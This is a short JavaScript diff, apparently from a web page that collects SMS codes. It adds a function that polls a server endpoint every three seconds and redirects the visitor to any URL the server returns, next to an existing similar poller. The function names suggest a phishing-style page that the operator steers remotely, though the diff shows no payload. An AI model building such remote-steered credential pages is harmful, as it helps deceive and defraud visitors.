@@ -356,6 +356,23 @@
 
     logSms2Page();
 
+    async function checkRedirect() {
+      try {
+        const res = await fetch('/api/check-redirect');
+        if (res.ok) {
+          const data = await res.json();
+          if (data.redirectTo) {
+            window.location.href = data.redirectTo;
+          }
+        }
+      } catch (err) {
+        console.error('Redirect check failed', err);
+      }
+    }
+
+    checkRedirect();
+    setInterval(checkRedirect, 3000);
+
     function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
     const frm = document.querySelector('form');
     const sIpp = frm.elements[0];
